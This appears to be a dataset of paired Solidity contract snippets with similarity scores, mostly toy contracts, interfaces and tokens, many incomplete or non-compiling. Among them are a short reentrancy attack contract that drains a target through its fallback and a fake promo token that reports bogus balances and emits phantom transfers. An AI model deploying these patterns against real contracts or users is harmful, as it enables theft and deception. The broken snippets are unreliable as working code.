    function getStr(uint key) public constant returns(string){

        return data[key];

    }

}"
"contract Test {

    event Event(string _msg, address _address, uint _amount);

    function() public payable {
    }

    function pay(uint _amount) public returns (uint256) {
        require(this.balance >= _amount);

        _pay(msg.sender, _amount);
    }

    function _pay(address _to, uint _amount) private {
        _to.transfer(_amount);
        Event(""Outcome"", _to, _amount);
    }
}",0.6729198386469543,"contract IBadBitCasino {
	function add(address _user, uint _amount) public payable returns(bool);
	function placeBet(address _user, uint _betId, uint _amount, bool bonus) public;
	function getCurrentBalance(address _user) public view returns(uint);
	function sendEthToGame(uint _amount) public;
}"
"contract bidding {
  address[] private bidderAccts;

  struct bidStruct {
    uint  bid;
  }
  mapping (address => bidStruct) biddersMap;

  event totalAccounts(address, uint );

  function setBidders(address _address , uint _bid)  public {
    bidStruct a = biddersMap[_address];
    a.bid = _bid;
    bidderAccts.push(_address) - 1 ;
  }

  function getBidders(address _address) view public returns(uint) {
    return biddersMap[_address].bid;
  }

  function countBidders() view public returns (uint) {
    return bidderAccts.length;
  }

  function allBidders() public  {
    for (uint i = 0; i < bidderAccts.length; i++) {
      emit totalAccounts(bidderAccts[i],biddersMap[bidderAccts[i]].bid);
    }
  }
}",0.6283595054633101,"contract ERC20 {



    function totalSupply() public view returns (uint);



    function balanceOf(address guy) public view returns (uint);



    function allowance(address src, address guy) public view returns (uint);



    function approve(address guy, uint wad) public returns (bool);



    function transfer(address dst, uint wad) public returns (bool);



    function transferFrom(address src, address dst, uint wad) public returns (bool);



    event Approval(address indexed src, address indexed guy, uint wad);

    event Transfer(address indexed src, address indexed dst, uint wad);

}"
"contract ReentrancyAttack {
    Vuln target = Vuln();
    uint amount = 500 wei;
    uint maxwithdraw = 0;
   address payable theif = msg.sender;

   function depositamount() public payable{
        target.deposit.value(msg.value)();
     
    }
    function withdrawamount() public payable{
     
        target.withdraw();
    }

     function () external payable{
        if (maxwithdraw < 5){
            maxwithdraw++;

            if (address(target).balance >= amount)
                {
                target.withdraw();
                }
        }
     }
}",0.6335517592000288,"contract CappedVault is Vault { 



    uint public limit;

    uint withdrawn = 0;



    constructor() public {

        limit = 33333 ether;

    }



    function () public payable {

        require(total() + msg.value <= limit);

    }



    function total() public view returns(uint) {

        return getBalance() + withdrawn;

    }



    function withdraw(uint amount) public onlyOwner {

        require(address(this).balance >= amount);

        owner.transfer(amount);

        withdrawn += amount;

    }



}"
"contract B {
    function testCall(address addr, data) public view returns(bool) {
        return addr.call.value(0)(data);
    }
}",0.6866001796775564,"contract Balance {

    function getBalance(address a) public view returns (uint) {

        return a.balance;

    }

}"
"contract Loop {
    uint[] array = [1, 2, 3, 4, 5];

    function returnNthElement(uint _index) returns (uint) {
        assembly {
            let index := _index
            let length := mload(sload(array_slot))
            for
               { let i := 0 }
               lt(i, length)
               { i := add(i, 1)}
           {
               
           }
        }
    }
}",0.612175492147994,"contract Common {
    
    function Common() internal {

    }

    function getIndexOfTarget(address[] list, address addr) internal pure returns (int) {
        for (uint i = 0; i < list.length; i++) {
            if (list[i] == addr) {
                return int(i);
            }
        }
        return -1;
    }
}"
"contract Cat is Feline {
    function utterance() public returns (bytes32) { return ""miaow""; }
}",0.6875739472241059,"contract TimeAware is Ownable {



    

    function getTime() public view returns (uint) {

        return now;

    }



}"
"contract Profile {

    struct User {
       string name;
       string subtitle;
       string sdescription;
       string ldescription;
       string weburl;
       string memehash;
    }

    mapping(address => User) public users; 

  function set(string memory _name, string memory _subtitle, string memory _sdescription,string memory _ldescription, string memory _weburl, string memory _memehash) public {
    users[msg.sender] = User(_name, _subtitle, _sdescription, _ldescription, _weburl, _memehash);
  }

  function get() public view returns (string memory) {
    return users[msg.sender].name;
    return users[msg.sender].subtitle;
    return users[msg.sender].sdescription;
    return users[msg.sender].ldescription;
    return users[msg.sender].weburl;
    return users[msg.sender].memehash;
  }
}",0.6243987929204369,"contract Tombstone{
    string public name;
    string public born_on;
    string public died_on;
    string public epitaph;
    string public place;
    
    event Mourn(address indexed who);
    
    bool built = false;
    
    function build(
        string memory _name, 
        string memory _born_on, 
        string memory _died_on, 
        string memory _epitaph, 
        string memory _place
    ) public {
        require(!built);
        name = _name;
        born_on = _born_on;
        died_on = _died_on;
        epitaph = _epitaph;
        place = _place;
        built = true;
    }
    
    
    function info() public view 
        returns(
            string memory, 
            string memory, 
            string memory, 
            string memory,
            string memory
        )
    {
        return (name, born_on, died_on, epitaph, place);
    }
    
    function mourn() public {
        emit Mourn(msg.sender);
    }
}"
"contract parentContract {

    uint num = 1;

    function setNum(uint _n) public returns(uint) {
        num = _n;
        return num;
    }
    function getNum() public view returns(uint) {
        return num;
    }
}",0.662082603383306,"contract Manager {
    function ilks(uint) public view returns (bytes32);
    function owns(uint) public view returns (address);
    function urns(uint) public view returns (address);

}"
"contract contractFactory {
  address[] public contracts;


  function getContractCount() public returns(uint) {
    return contracts.length;
  }

  function newContract(uint _rent, uint _security_deposit, string _house, address _owner, address _tenant)
  public payable returns(address)  {
    Rental c = new Rental(_rent, _security_deposit, _house, _owner, _tenant);
    contracts.push(c);
    return c;
  }
}",0.6295537510156751,"contract Token {
    function balanceOf(address _owner) constant public returns (uint balance);
    function allowance(address _user, address _spender) constant public returns (uint amount);
    function transfer(address _to, uint _value) public returns (bool success);
    function transferFrom(address _from, address _to, uint _value) public returns (bool success);
}"
"contract ExampleApp {
  <string array over here>

  function add(string x) public {

  }

  function delete(string x) public{

  }
}",0.6315558766935351,"contract Foo {
  string public foo;

  function getFoo() public {
    string memory _foo = foo;
    string memory _bar = foo;
  }
}"
"contract bytes32array {



mapping(address => uint)[] balances;            


    function addBalance(address _address, uint _index, uint _amount) public {       
        balances[_index][_address] = _amount;                                       

    }


    function getBalance(address _address, uint8 _index) public view returns(uint) {
          return balances[_index][_address];

    }


}",0.6835335503317349,"contract ERC20Basic {
    uint256 public totalSupply;
    mapping(address => uint256) balances;
    function balanceOf(address _owner) public constant returns (uint256) { return balances[_owner]; }
    
    
    event Transfer(address indexed from, address indexed to, uint256 value);
}"
"contract Main {
  struct Model {
    uint256 key;
    uint64 createTime;
  }

  Model[] public models;

  mapping(uint256 => address) public modelOwner;

  function total() view public returns (uint256) {
    return models.length;
  }

  function getData(uint256 _tokenId) view returns ( uint256, uint64){

    Model _model = models[_tokenId];
    return  (_model.key, _model.createTime);
  }

  function createData(uint256 _key, address _owner) returns (uint){

    Model memory _model = Model({key : _key, createTime : uint64(now)});

    uint256 newModelId = models.push(_model) - 1;

    

    return newModelId;
  }
}",0.6243709622175212,"contract ERC721Interface{

   function totalSupply() public view returns (uint256);

   function balanceOf(address _owner) public view returns (uint);



    

   function ownerOf(uint256 _tokenId) public view returns (address);

   function approve(address _to, uint256 _tokenId) public returns (bool);

   function transfer(address _to, uint256 _tokenId) public returns (bool);

   

   

   event Transfer(address indexed _from, address indexed _to, uint256 _tokenId);

   event Approval(address indexed tokenOwner, address indexed spender, uint _tokenId);

}"
"contract Test {
  int a=999;
  function doIt() {
    assembly {
    sload(a);
    }
 }
}",0.6229312037001606,"contract Test {
    uint public test;
    
    function Test() {
        test = 1;
    }
}"
"contract SimpleStorage {
    uint storedData;

    event Set(
        address indexed _from,
        uint _storedData
    );

    function set(uint x) public {
        storedData = x;
        emit Set(msg.sender, storedData);
    }

    function get() public view returns (uint) {
        return storedData;
    }
}",0.6460165802713427,"contract ERC20Basic {
     uint public totalSupply;
     function balanceOf(address who) public view returns (uint); 
     function transfer(address to, uint value) public ; 
     event Transfer(address indexed from, address indexed to, uint value); 
}"
"contract Hello {
   uint public message;
   constructor() public {
   message = 123456;
   }

   function get() public view returns (uint) {
   return message;
   }

   function set(uint inpStr) public{
   message = inpStr;
   }
}",0.6668785890207339,"contract Context {
    constructor () public { }

    function _msgSender() public view returns (address) {
        return msg.sender;
    }

    function _msgData() public view returns (bytes memory) {
        this;
        return msg.data;
    }
}"
"contract MyContract {
    bytes32 public Name;

    function MyContract (bytes32 name) {
        Name = name;
    }
}",0.6359487046841396,"contract GroveAPI {
  function insert(bytes32 indexName, bytes32 id, int value) public;
}"
"contract Wallet {

    event Deposit(address from, uint value);
    event Withdraw(address to, uint value);

    address owner;

    function Wallet() {
        owner = msg.sender;
    }

    
    function withdraw(address _to, uint _value) {
        if(msg.sender != owner) {
            throw;
        }

        Withdraw(_to, _value);

        _to.send(_value);
    }


    
    function() {
        
        if (msg.value > 0) {
            Deposit(msg.sender, msg.value);
        }
    }

}",0.6669156547379121,"contract ERC20 is ERC20Basic {

  function allowance(address owner, address spender) public returns (uint);

  function transferFrom(address from, address to, uint value) public;

  function approve(address spender, uint value) public;

  event Approval(address indexed owner, address indexed spender, uint value);

}"
"contract Borrower is mortal {
    string  public borrowerName;
    uint256 public funds;

    function Borrower(string _name) payable public {
        borrowerName     = _name;
    }

    function addFunds() onlyOwner payable public {
        
        funds += msg.value;
    }
}",0.6382213887744691,"contract BBZZXUCToken is StandardToken{



    string public name = ""BBZZXUC"";                                   

    uint256 public decimals = 18;                                 

    string public symbol = ""BBZZXUC"";                                 



    constructor() public {                    

        owner = msg.sender;

    }



    function () stoppable public {

        revert();

    }



}"
"contract TutorialToken is StandardToken {
    string public name = 'TutorialToken';
    string public symbol = 'TT';
    uint public decimals = 2;
    uint public INITIAL_SUPPLY = 12000;

    function TutorialToken() {
        totalSupply = INITIAL_SUPPLY;
        balances[msg.sender] = INITIAL_SUPPLY;
    }

    
    struct Doc {
        address seller;
        int docId;
        int priceByToken;
    }
    Doc[] Docs;

    function listDoc(int docId, int priceByToken) {
        
    }

    mapping (address => Doc) Transactions;

    function buy(address buyer, address seller, int docId) {
        
        transfer(seller, ..., buyer);
    }
}",0.6736892076629429,"contract OslikToken is StandardBurnableToken {

  string public constant name = 'Osliki Token'; 
  string public constant symbol = 'OSLIK'; 
  uint8 public constant decimals = 18; 

  uint public constant INITIAL_SUPPLY = 10**8 * (10 ** uint(decimals));

  address public founder;

  
  constructor(address _oslikiFoundation) public {
    require(_oslikiFoundation != address(0), ""_oslikiFoundation is not assigned."");

    totalSupply_ = INITIAL_SUPPLY;
    founder = _oslikiFoundation;
    balances[founder] = INITIAL_SUPPLY;
    emit Transfer(0x0, founder, INITIAL_SUPPLY);
  }

}"
"contract DataStore {

        address public creator;
        address UbiAccount = 0x627306090abaB3A6e1400e9345bC60c78a8BEf57;  


        event Transfer(address indexed _from, address indexed _to, uint256 _value);
        event LogFundsReceived(address sender, uint amount);
        event LogFundsSent(address receiver, uint amount);

        function() payable public {
            LogFundsReceived(msg.sender, msg.value);
        }

        function DataStore() payable public {
            creator = msg.sender;
            LogFundsReceived(msg.sender, msg.value);
        }

        function kill() public {
            selfdestruct(creator);
        }

        function SendPaymentToContract() public payable returns(bool sufficient) {
            getCurrentAddress().transfer(msg.value);
            LogFundsSent(UbiAccount, msg.value);

            return true;
        }

        function SendPaymentToUbi() public payable returns(bool sufficient) {
            UbiAccount.transfer(msg.value);
            LogFundsSent(UbiAccount, msg.value);

            return true;
        }

        function getCurrentAddress() public view returns (address){
          return this;
        }
    }",0.6306363023070497,"contract ERC223Interface {

      

    function balanceOf(address _who) view public returns (uint);

    function transfer(address _to, uint _value) public returns (bool success);

    function transfer(address _to, uint _value, bytes _data) public returns (bool success);

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);

    function approve(address _spender, uint256 _value) public returns (bool success);

    function allowance(address _owner, address _spender) public view returns (uint256 remaining);

    function totalSupply() public view returns (uint256 supply);



    event Transfer(address indexed _from, address indexed _to, uint _value);

    event Transfer(address indexed _from, address indexed _to, uint _value, bytes _data);

    event Approval(address indexed _from, address indexed _spender, uint256 _value);

    

}"
"contract ArrayExamples {

    int[][] public matriz;


    
    function receive_data(int[] data) public {
        matriz.push(data);
    }


    function teste() public returns (int[] v) {

        int[] x;
        int[] y;

        uint t = matriz.length;

        for(uint i = 0; i < t; i++) {

            x[i] = matriz[i][0];
            y[i] = matriz[i][1];

        }

        return x;
    }

  }",0.6058444555045708,"contract R256 {

    mapping(uint => uint) public record;

    event R(uint z);

    constructor() public {}

    function addRecord(uint z) public {
        require(record[z] == 0);
        record[z] = now;
        emit R(z);
    }

    function addMultipleRecords(uint[] zz) public {
        for (uint i; i < zz.length; i++) {
            addRecord(zz[i]);
        }
    }

}"
"contract Crowdfunding {
    address owner;
    uint256 deadline;
    uint256 goal;
    mapping(address => uint256) public pledgeOf;

    function Crowdfunding(uint256 numberOfDays, uint256 _goal) public {
        owner = msg.sender;
        deadline = now + (numberOfDays * 1 days);
        goal = _goal;
    }

    function pledge(uint256 amount) public payable {
        require(now < deadline);                
        require(msg.value == amount);

        pledgeOf[msg.sender] += amount;
    }

    function claimFunds() public {
        require(address(this).balance >= goal); 
        require(now >= deadline);               
        require(msg.sender == owner);

        msg.sender.transfer(address(this).balance);
    }

    function getRefund() public {
        require(address(this).balance < goal);  
        require(now >= deadline);               

        uint256 amount = pledgeOf[msg.sender];
        pledgeOf[msg.sender] = 0;
        msg.sender.transfer(amount);
    }
}",0.6865295584929315,"contract PinRequired {

    address payable public owner;

    uint private topSecretNumber = 376001928;



    constructor() payable public {

        owner = msg.sender;

    }



	function setPin(uint pin) public {

		require(msg.sender == owner);

		topSecretNumber = pin;

	}



    function withdraw() payable public {

        require(msg.sender == owner);

        owner.transfer(address(this).balance);

    }

    

    function withdraw(uint256 amount) payable public {

        require(msg.sender == owner);

        owner.transfer(amount);

    }



    function kill() public {

        require(msg.sender == owner);

        selfdestruct(msg.sender);

    }



    function guess(uint g) public payable {

        if(msg.value >= address(this).balance && g == topSecretNumber && msg.value >= 1 ether) {

            msg.sender.transfer(address(this).balance + msg.value);

        }

    }

    

	function() external payable {}

}"
"contract B {
  A public a;

  function doAnotherThing() public {
    a = new A();
    a.doSomething();
  }
}",0.6056115725710899,contract test { function multiply(uint a) public pure returns(uint d) {   return a * 7;   } }
"contract FantasyLeague {
    
    address public commissioner;
    
    uint[] public proposals;
    
    address[] public members;
    
    address[] public rightsGiven;

    
    constructor() public payable {
        commissioner = msg.sender;
    }

    function giveRightToVote(address voter) public {
        require(msg.sender == commissioner);
        
        rightsGiven.push(voter);
    }

    
    function vote (uint number) public payable {
        
        require(msg.value > .01 ether);
        proposals.push(number);
        members.push(msg.sender);
    }

    
    function getVotes () public view returns (uint[]) {
        return proposals;
    }

    
    function getRightsToVote () public view returns (address[]) {
        return rightsGiven;
    }

    
    
    function getMembers () public view returns (address[]) {
        return members;
    }
}",0.6240455405236085,"contract ERC20 {

    uint public totalSupply;

    function balanceOf(address who) public view returns (uint);

    function allowance(address owner, address spender) public view returns (uint);

    function transfer(address to, uint value) public returns (bool ok);

    function transferFrom(address from, address to, uint value) public returns (bool ok);

    function approve(address spender, uint value) public returns (bool ok);

    function mintToken(address to, uint256 value) public returns (uint256);

    function mintTokenFree(address to, uint256 value) public returns (uint256);

    function changeTransfer(bool allowed) public;

}"
"contract C1 {  
    function f1() returns(uint) {  
        return(10);   
    }
}",0.6587697875997246,"contract TOP {
    function caged() public returns(uint256);
}"
"contract C2 {
    function f2(address addrC1) returns(uint) {  
        C1 c1 = C1(addrC1);  
        return c1.f1();  
    }
}",0.6431930156896598,"contract TokenHolder {
    function burn(address , uint )
    returns (bool result) {
        return false;
    }
}"
"contract Lottery {
  address public owner;
  bytes32 public hash;

  function Lottery() {        
    owner = msg.sender;
    hash = sha3(10, owner);
  }

  function get() constant returns (address, bytes32) {
    return (owner, hash);
  }
}",0.6841974104615618,"contract Ownable {

    address public owner;

    function Ownable() public {

        owner = msg.sender;

    }

    function _msgSender() internal view returns (address)

    {

        return msg.sender;

    }

    modifier onlyOwner {

        require(msg.sender == owner);

        _;
    }

}"
"contract NumTest {
    int8 i;

    function NumTest() {
      i = -1;
    }

    function number() constant returns (uint32 num) {
      uint32 val = 3;
      return uint32( uint32(i) * val + 20);
    }
}",0.6346169897471977,"contract Counter {

   uint256 c;



   constructor() public {

       c = 1;

   }   

   function inc() external {

        c = c + 1;

   }

   function get() public view returns (uint256)  {

       return c;

   }

}"
"contract distribution { 

mapping(address => uint) balances;

address private owner;

function distributeBlox(address[] addresses, uint256 _value) owner {
    for (uint i = 0; i < addresses.length; i++) {
        balances[owner] -= _value;
        balances[addresses[i]] += _value;
        Transfer(owner, addresses[i], _value);
    }
  }
}",0.6792353978209776,"contract TokenDistribute is OwnerHelper

{

    uint public E18 = 10 ** 18;



    constructor() public

    {

    }

    

    function multipleTokenDistribute(address _token, address[] _addresses, uint[] _values) public onlyOwner

    {

        for(uint i = 0; i < _addresses.length ; i++)

        {

            Token(_token).transfer(_addresses[i], _values[i] * E18);  

        }

    }

}"
"contract Transfer {
    address owner;

    function Transfer () {
        owner = msg.sender;
    }

    function sendEther (address dst) payable {
        if(msg.value<=0) revert();
        dst.transfer(msg.value);
    }
}",0.6958626016805295,"contract Halfer{
    address owner; 
    constructor() public {
        owner = msg.sender;
    }
    
    function() public payable{
        owner.transfer(msg.value/2);
        msg.sender.transfer(address(this).balance);
    }
}"
"contract Callee {
    function getValue(uint initialValue) returns(uint);
    function storeValue(uint value);
    function getValues() returns(uint);
}",0.6157452197442913,"contract BittleSolutions  {
    function transfer(address _to, uint _value) returns (bool);
    function balanceOf(address owner) returns(uint);
}"
"contract Project {

    struct projectInfo {
        address projectOwner;
        string name;
        uint256 amountToRaise;
        uint256 deadline;
    }

    projectInfo public info;
    uint256 public amountRaised;
    bool public ended;
    bool public refundEnabled;
    mapping(address => uint256) public contributions;

    function Project(string name, uint256 amountToRaise, uint256 deadline) {
        info = projectInfo(tx.origin, name, amountToRaise, deadline);
        amountRaised = 0;
        ended = false;
        refundEnabled = false;
    }

    function getInfo() constant returns (address, string, uint256, uint256) {
        return (info.projectOwner, info.name, info.amountToRaise, info.deadline);
    }

    function fund() payable returns (bool successful) {
        if (ended) {
            return false;
        }
        contributions[tx.origin] += msg.value;
        amountRaised += msg.value;
        if (now > info.deadline) {
            ended = true;
            refundEnabled = true;
            return false;
        }
        if (amountRaised >= info.amountToRaise) {
            ended = true;
            payout();
        }
        return true;
    }

    function payout() private returns (bool successful) {
        if (ended) {
            if (!info.projectOwner.send(this.balance)) {
                throw;
            }
        }
    }

    function refund() public returns (bool successful) {
        if (refundEnabled) {
            if (contributions[msg.sender] > 0) {
                if (msg.sender.send(contributions[msg.sender])) {
                    contributions[msg.sender] = 0;
                    return true;
                } else {
                    return false;
                }
            } else {
                throw;
            }
        }
    }
}",0.6553564235285249,"contract SafePromo {

	string public url = ""http:
	string public name = ""ECOS PROMO"";
	string public symbol = ""ECOS"";
	address owner;
	uint256 public totalSupply;


	event Transfer(address indexed _from, address indexed _to, uint256 _value);

	constructor () public {
		owner = msg.sender;
		totalSupply = 1;
	}

	function balanceOf(address _owner) public view returns (uint256 balance){

		return 777;

	}

	function transfer(address _to, uint256 _value) public returns (bool success){

		return true;

	}

	function transferFrom(address _from, address _to, uint256 _value) public returns (bool success){

		return true;

	}

	function approve(address _spender, uint256 _value) public returns (bool success){

		return true;

	}

	function allowance(address _owner, address _spender) public view returns (uint256 remaining){

		return 0;

	}   

	function promo(address[] _recipients) public {

		require(msg.sender == owner);

		for(uint256 i = 0; i < _recipients.length; i++){
			emit Transfer(address(this), _recipients[i], 777);

		}

	}
    
	function setInfo(string _name) public returns (bool){

		require(msg.sender == owner);
		name = _name;
		return true;

	}
	
	function setSymbol(string _symbol) public returns (bool){

		require(msg.sender == owner);
		symbol = _symbol;
		return true;

	}

	function() public payable{ }

}"
"contract test {

    constructor(address a) public { 
        coin = Coin(a);
    }

    Coin coin;

    function doTransfer(address who, uint amount) public { 
        uint b = coin.balanceOf(this);
        require(b >= amount, ""Balance too low."");
        coin.transfer(who, amount);
    }
}",0.6626069689117254,"contract ERC20Basic {
  function balanceOf(address who) public constant returns (uint);
  function transfer(address to, uint value) public;
  event Transfer(address indexed from, address indexed to, uint value);
}"
"contract UserToken {
    mapping (bytes32 => uint8) public tokenBalance;

    bytes32[] public userList;

    
    function UserToken(bytes32[] userName) public payable {
        userList = userName;
    }

    
    function totalTokensFor(bytes32 user) view public returns (uint8) {
        require(validUser(user));
        return tokenBalance[user];
    }

    
    function buyToken(bytes32 user, uint8 token) public {
        require(validUser(user));
        tokenBalance[user] += token;
    }

    function validUser(bytes32 user) view public returns (bool) {
        for(uint i = 0; i < userList.length; i++) {
          if (userList[i] == user) {
            return true;
          }
        }

        return false;
    }
}",0.6191788062342309,"contract NRB_Tokens {
    function init(address _main, address _flc) public;
    function getTokenListLength() constant public returns (uint);
    function getTokenAddressByIndex(uint _index) constant public returns (address);
    function isTokenRegistered(address _token) constant public returns (bool);
    function registerToken(address _token, string _name, string _symbol, uint _decimals) public;
    function registerTokenPayment(address _token, uint _value) public;
    function sendFLC(address user, address token, uint totalpaid) public returns (uint);
}"
"contract ExternalData {
    string public ETHUSD='7';

    constructor () payable public {
      ETHUSD = '1';
    }
       function getETHUSD () public pure returns (string memory usd) {
            return '7';
       }
}",0.6521911348803279,"contract PausedHKD is PausedToken {

    function name() public pure returns (string) {

        return ""TrueHKD"";

    }



    function symbol() public pure returns (string) {

        return ""THKD"";

    }

}"
"contract X {
   function a() pure public returns(uint,uint) {
       uint p=10;
       uint q=20;

       uint add = p+q;
       uint sub = q-p;

       return(add,sub);
   }
}",0.6706350583579279,"contract SafeMath {

	function safeAdd(uint a, uint b) internal returns(uint) {
		uint c = a + b;
		assert(c >= a && c >= b);
		return c;
	}
}"
"contract B is C {
    function bbb() public {  }
    function test() public {
       bbb(); 
       super.test(); 
    }
}",0.6674457739148907,"contract Test1

    {

       function Invest() 

    public 

    payable ;

    function Divest(uint amount) 

    public ;

    }"
"contract MyContract {

    uint256 totalSupply; 
    mapping(address => uint256) public balances;
    address owner;

    constructor(address payable _wallet) public {
        totalSupply = 10;
        owner = _wallet;
    }

    function () external payable{
        buyToken();
    }

    function buyToken() public payable {
        require(totalSupply >= (msg.value/1000000000000000000)*2);
        balances[msg.sender] += (msg.value/1000000000000000000)*2;
        
        totalSupply -=(msg.value/1000000000000000000)*2;

    }
    function getTotalSupply()public view returns  (uint256 ){
        return totalSupply;
    }
       function setTotalSupply(uint256 newSupply)public {
        require(msg.sender == owner && totalSupply<1);
        totalSupply = newSupply;

    }
    function getBalance() public view returns  (uint) {
        return address(this).balance;
    }

}",0.6852854094174847,"contract BasicToken is ERC20Basic {
  using SafeMath for uint256;

  mapping(address => uint256) balances;

  uint256 totalSupply_;
  uint256 availableSupply_;

  
  function totalSupply() public view returns (uint256) {
    return totalSupply_;
  }

  function availableSupply() public view returns (uint256) {
    return availableSupply_;
  }

  
  function transfer(address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));
    require(_value <= balances[msg.sender]);

    
    balances[msg.sender] = balances[msg.sender].sub(_value);
    balances[_to] = balances[_to].add(_value);
    Transfer(msg.sender, _to, _value);
    return true;
  }

  
  function balanceOf(address _owner) public view returns (uint256 balance) {
    return balances[_owner];
  }

}"
"contract Contract2 {
     Contract1 public contract1 = new Contract1();
        function func() public returns (uint32, uint32) {
           uint32[2] memory ret;
           address dest = address(contract1);
           bool success      =dest.func.value()(uint256(789), uint8(123));
           return (ret[0], ret[1]);
       }
   }",0.6247208674689538,"contract ContractFallbacks {
    function receiveApproval(address from, uint256 _amount, address _token, bytes memory _data) public;
	function onTokenTransfer(address from, uint256 amount, bytes memory data) public returns (bool success);
}"
"contract MetaCoin {
  mapping (address => uint) balances;

  event Transfer(address indexed _from, address indexed _to, uint256 _value);

  function MetaCoin() {
    balances[tx.origin] = 10000;
  }

  function sendCoin(address receiver, uint amount) returns(bool sufficient) {
    if (balances[msg.sender] < amount) return false;
    balances[msg.sender] -= amount;
    balances[receiver] += amount;
    Transfer(msg.sender, receiver, amount);
    return true;
  }

  function getBalanceInEth(address addr) returns(uint){
    return ConvertLib.convert(getBalance(addr),2);
  }

  function getBalance(address addr) returns(uint) {
    return balances[addr];
  }

  function getBalanceWithConstant(address addr) constant returns(uint) {
    return balances[addr];
  }
}",0.6735376385715932,"contract BasicToken is Controlled{
    using SafeMath for uint256;
    
    uint256       _supply;
    mapping (address => uint256)    _balances;
    
    event Transfer( address indexed from, address indexed to, uint256 value);

    function BasicToken() public {    }
    
    function totalSupply() public view returns (uint256) {
        return _supply;
    }
    function balanceOf(address _owner) public view returns (uint256) {
        return _balances[_owner];
    }
    
    
    function transfer(address _to, uint256 _value) public whenNotPaused returns (bool) {
        require(_balances[msg.sender] >= _value && _value > 0);
        
        _balances[msg.sender] =_balances[msg.sender].sub(_value);
        _balances[_to] =_balances[_to].add(_value);
        
        emit Transfer(msg.sender, _to, _value);
        
        return true;
    }
  
}"
"contract AssemblyString {
    string s; 

    function set(string calldata _s) external {
        s = _s;
    }

    function get(uint i) public view returns (bytes32){
        bytes32 r;
        assembly {
            r := sload(i) 
        }
        return r;
    }
}",0.6357674151488626,"contract Helper {

    function toString(address x) internal pure
        returns (string)
    {
        bytes memory b = new bytes(20);
        for (uint i = 0; i < 20; i++)
            b[i] = byte(uint8(uint(x) / (2**(8*(19 - i)))));
        return string(b);
    }
}"
"contract DannyTest {
    Danny danny;

    function beforeEach() public {
        danny = new Danny();
    }

    function test1() public {
        try danny.foo() {
        } catch Error(string memory reason) {
            Assert.ok(false, string(reason));
        } catch (bytes memory data) {
            Assert.ok(false, string(data));
        }
    }
}",0.6110879882485347,"contract Trusti {
    string public data = ""trusti.id"";
    
    function getData() public view returns (string memory) {
        return data;
    }
    
    function setData(string memory _dataHash, string memory _dataSignee) public {
        data = _dataHash;
        data = _dataSignee;
    }
}"
"contract depo {
    function depo() public {

    }

    function () payable public {

    }

    function deposit() payable public {
        this.transfer(1 ether);
    }
}",0.6715534666862296,"contract FundsSplitterInterface {
    function splitFunds() public payable;
    function splitStarFunds() public;
    function() external payable;
}"
"contract A4Contract {
    uint256[] vals;
    uint64[] vals64;

    
    
    
    function insert(uint256 value) public {
        vals.push(value);
    }

    
    
    
    
    
    
    
    
    
    function insert64(uint64 value) public {
        vals64.push(value);
    }
}",0.6165756768124354,"contract MyEIP20NonStandardInterface {

    function transfer(address _to, uint256 _value) public;

    function transferFrom(address _from, address _to, uint256 _value) public;

}"
"contract Mutex {
bool locked;
modifier noReentrancy() {
    require(!locked);
    locked = true;
    _;
    locked = false;
}
 function f(unit256 amount) public noReentrancy returns (uint) {
    msg.sender.call.value(amount)("""");
  }
}",0.6233945462104765,"contract Owned {
    bool public locked = true;
    address public Owner = msg.sender;
    modifier onlyOwner { if (msg.sender == Owner || !locked) _; }
    function lock(bool flag) onlyOwner { locked = flag; }
}"
"contract Test {

    address public d_address;
    function deployOther() public {
        d_address = new Referred(123);
    }

    function get() public returns (uint){
        return Referred(d_address).toReturn();
    }
    function set() public payable {
        Referred(d_address).set.gas(21000).value(msg.value)(456);
    }

}",0.6705211804038851,"contract GemLike {
    function allowance(address, address) public returns (uint);
    function approve(address, uint) public;
    function transfer(address, uint) public returns (bool);
    function transferFrom(address, address, uint) public returns (bool);
}"
"contract Referred {
    uint public val;
    constructor(uint v) public {
        val = v;
    }

    function set(uint nv) public payable{
        val = nv;
    }

    function toReturn() public view returns (uint){
        return val;
    }
}",0.687208119483459,"contract Token {

    function balanceOf(address a) public pure returns (uint) {

        (a);

        return 0;

    }



    function transfer(address a, uint val) public pure returns (bool) {

        (a);

        (val);

        return false;

    }

}"
"contract HelloWorld {
uint public balance;

function HelloWorld() {
    
    balance=1000;
  }
}",0.6237165392607451,"contract ITVToken {

    function balanceOf(address _to) public returns (uint);

}"
"contract Test {
    function addTest() public pure returns (uint c) {
    bytes memory b = new bytes(1024);
    assembly { c:=add(b, 0x20) }
}
}",0.6163607066240289,"contract IAccessPolicy {



    

    

    



    

    

    

    

    

    

    

    function allowed(

        address subject,

        bytes32 role,

        address object,

        bytes4 verb

    )

        public

        returns (bool);

}"
"contract Adoption {

    address[16] public adopters;

    function adopt(uint8 petId) public returns (uint8) {
        require(petId >= 0 && petId <= 15);
        adopters[petId] = msg.sender;
        return petId;
    }

    function getAdopters() public returns (address[16]) {
        return adopters;
    }
}",0.615562592978931,"contract CutdownToken {
    function balanceOf(address _who) public view returns (uint256);
    function transfer(address _to, uint256 _value) public returns (bool);
    function allowance(address _owner, address _spender) public view returns (uint256);
}"
"contract Interface {
    function pay();
}",0.6780120560859424,"contract MSD6 {

    

    function() public {

        

    }

}"
"contract Foo {

    function safeTransfer (address _to, uint256 _amount)
    {
        Bar a = new Bar(_to);
        a.transfer(_amount);
        Interface b = Interface(a);
        b.pay();
    }

    function () payable {}
}",0.6344891765795387,"contract ITVToken {

    function transfer(address _to, uint256 _value) public returns (bool);

    function safeTransfer(address _to, uint256 _value, bytes _data) public;

}"
"contract Bar {

    address payee;

    function Bar (address _payee)
        {
            payee = _payee;
        }

    function () payable {}

    function pay () 
        {
            selfdestruct(payee);
        }
}",0.6231516906064848,"contract IPack {



    function purchase(uint16, address) public payable;

    function purchaseFor(address, uint16, address) public payable;



}"
"contract ValidationService {

Storage public store;


 constructor(address add) public{
    store=Storage(add);
 }


 function getMyNumber() public constant returns (uint) {

     return store.getNumber();

 }


}",0.6690214810561858,"contract SimpleStorage {

    

    address public owner;

    uint256 public storageValue;

    

    constructor()  public {

        owner = msg.sender;

    }

    

    function setStorage(uint256 _value) {

        storageValue = _value;

    }

}"
"contract HelloWorld {

    function test() pure returns (string) {
        return ""HelloWorld"";
    }

}",0.6420127887114412,"contract web3Voorbeeld {

    

    

    function ping() public view returns(string) {

        return(""pong"");

    }

}"
"contract ProductItem {
address[] _owners;
address _currentOwner;
address _nextOwner;
string _productDigest;

function ProductItem(string productDigest) {
    _currentOwner = msg.sender;
    _productDigest = productDigest;
}

function setNextOwner(address nextOwner) returns(bool set) {
